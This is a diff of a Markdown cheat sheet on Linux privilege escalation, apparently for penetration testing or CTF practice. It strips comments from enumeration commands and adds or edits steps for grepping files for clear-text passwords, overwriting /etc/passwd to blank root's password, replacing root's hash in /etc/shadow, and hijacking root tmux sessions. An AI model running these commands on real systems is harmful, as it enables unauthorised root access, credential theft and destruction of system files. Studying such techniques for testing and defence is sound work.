@@ -22,17 +22,18 @@ Simple and accurate guide for linux privilege escalation tactics
 # Basic System Enumeration
 Structure : Linux Command // <Comment / Tip>
 ```
-uname -a // What OS kernel are we using?
-hostname // What is my hostname?
-lscpu // What is our CPU architecture?
-ls /home // Any Users? Can we access their home directories?
-ls /var/www/html // Any web config files? Do they contain DB or user credentials?
-ps aux | grep root // What services are running as root? Any cron jobs running specific files as root? Can we write to those files? 
-netstat -tulpn // What is running? Are they bound to local host but not from the public? Possible port forwarding
-ps -aux | grep root | grep mysql // Is MySQL running as root?
-ifconfig // What is our IP? Are we dual-homed?
-find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; // Any files that contains clear-text credentials?
-locate pass | more // Any files with the name pass?
+uname -a 
+hostname 
+lscpu 
+ls /home 
+ls /var/www/html 
+ls /var/www/
+ps aux | grep root 
+netstat -tulpn 
+ps -aux | grep root | grep mysql
+ifconfig 
+find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;
+locate pass | more
 
 ```
 # Bash History
@@ -76,7 +77,8 @@ OR
   
 OR
 
-  echo root::0:0:root:/root:/bin/bash > /etc/passwd // Remove Root's Password
+  echo root::0:0:root:/root:/bin/bash > /etc/passwd
+  id && whomai
   
 ```  
 /etc/shadow 
@@ -87,7 +89,7 @@ OR
    vi /etc/shadow
    Replace root's hash with the output that you generated
    wq!
-   su root // Provide the new root password you generated (Example: NewRootPassword)
+   su root 
    id && whoami
    
 ```    
@@ -138,9 +140,11 @@ URL: https://github.com/SecWiki/linux-kernel-exploits
 
 # Sudo -l
 
-Sudo -l // What binaries can we execute with Sudo?
+Sudo -l 
 
-// Example Output
+What binaries can we execute with Sudo?
+
+Example Output
 
 User www-data may run the following commands on <hostname>
 
@@ -575,11 +579,19 @@ It allows multiple terminal sessions to be accessed simultaneously in a single w
 
 It is useful for running more than one command-line program at the same time.
 
+Tmux Cheat Sheet: https://tmuxcheatsheet.com/
+
 Privilege Escalation
 
 ```
 tmux list-sessions                        // Any Tmux sessions running as root?
 /tmp/tmux-14/default-root                 // Root Tmux Session
 tmux -S /tmp/tmux-14/default-root         // Replace Path to Socket (Depending on your results)
+
+OR
+
+tmux list-sessions                        // Any Tmux sessions running as root?
+/tmp/tmux-14/default-root                 // Root Tmux Session
+tmux -S /opt/.dev/gbm/ attach -t 0        // Replace Path to Session (Depending on your results)
 
 ```
